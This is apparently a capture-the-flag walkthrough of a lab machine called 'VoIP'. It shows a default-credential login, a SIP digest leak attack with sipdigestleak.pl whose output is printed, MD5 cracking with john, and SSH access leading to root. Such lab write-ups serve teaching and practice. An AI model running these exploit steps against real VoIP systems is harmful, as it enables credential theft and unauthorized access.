# VoIP
### Enumeration
Ports 22, 80, 8000 are open.

##### 80
"Voip Manager" login portal.

##### 8000
Another login portal although not immediately obvious what it is for. The credentials `admin:admin` get us in. It appears to also be a VoIP management system. We can see some version information:

```
Hardware version: 3302BC
VOIP: v2.0
```

We find some users:

```
William:
ID-2983

Emma:
ID-3029

Voiper:
ID-1462

John:
ID-2174

Olivia:
ID-9811

Ava:
ID-2111

Rocky:
Disabled

Noah
Disabled
```

##### 5060
Port 5060 appears to be open, but can't get it to respond to anything basic.

It turns out that 5060 is vulnerable to a [SIP digest leak attack](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf). We can use the [sippts toolkit](https://github.com/linuxmaniac/sippts) (in particular, the `sipdigestleak.pl` script) to perform the exploit:

```shell-session
$ perl sipdigestleak.pl -h 192.168.55.156
[+] Connecting to 192.168.55.156:5060
[+] Sending INVITE 2983 => 100
[-] 180 Ringing
[-] 200 OK
[+] Sending ACK
[+] Waiting for the BYE message
[-] BYE received
[+] Sending 407 Proxy Authentication Required
[-] Auth: Digest username="adm_sip", uri="sip:127.0.0.1:5060", password="074b62fb6c21b84e6b5846e6bb001f67", algorithm=MD5

$ echo 074b62fb6c21b84e6b5846e6bb001f67 -n > hash.txt

$ hashid -j hash.txt
--File 'hash'--
Analyzing '074b62fb6c21b84e6b5846e6bb001f67'
[+] MD2 [JtR Format: md2]
[+] MD5 [JtR Format: raw-md5]
[+] MD4 [JtR Format: raw-md4]
...

$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
passion          (?)     
1g 0:00:00:00 DONE (2022-04-02 19:18) 100.0g/s 76800p/s 76800c/s 76800C/s jeffrey..james1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

We use `--format=raw-md5` since `sipdigestleak.pl` tells us the algorithm is MD5. We could have continued with other forms of MD5 if we didn't manage to crack the password using this format.

Ultimately, we have the credentials `adm_sip:passion`, which we can use to login to the `Voip Manager` portal.

If we look at `/cdr.php`, we see there's a row with `raw` in the `Record` column, that we can click to download a file called `2138.raw`.

The file is a VoIP audio capture. According to [this forum thread](https://community.cisco.com/t5/ip-telephony-and-phones/how-to-save-rtp-streams-from-wireshark-and-play-it-using-an/td-p/1966791), we can decode the audio using Audacity. We use `File > Import > Raw Data`. We can get the information we need for the import dialog from `/streams.php`. We see `8000 Hz` is the sample rate, and we see the string `pcm_mulaw`, indicating `U-Law` is the encoding. Finally, we specify that there is one channel (mono audio).

The transcript of the audio is:

```
Your password has been changed to `Password1234`, where 'P' is capital.
```

### Foothold
Trying this as the SSH password for all the users we found on the other webservice, we eventually succeed with `voiper:Password1234`.

### Privilege Escalation
Running `sudo -l`, we see we can execute anything as sudo.

### Post-exploit
We should have noted this section of the VoIP server config:

```xml
<!-- Dynamnic response generator -->  
  
 <recv response="*">  
	 <action>  
		 <ereg regexp=“^[A-Za-z0-9_.]+$" search_in="response" assign_to="status"/>  
		 <strcmp assign_to="result" variable="1" value=“status" />  
		 <test assign_to="status" variable="result" compare="equal" value="0.0"/>  
	 </action>  
 </recv>  
 <send>  
 <![CDATA[  
 $result  
 ]]>  
 </send>
```

Specifically, the wildcard in `<recv response="*">`, which indicates that we could respond to the `BYE` message from the VoIP server with a `407 Proxy Auth Required` instead of `ACK`. This is what makes the server vulnerable to the digest leak attack.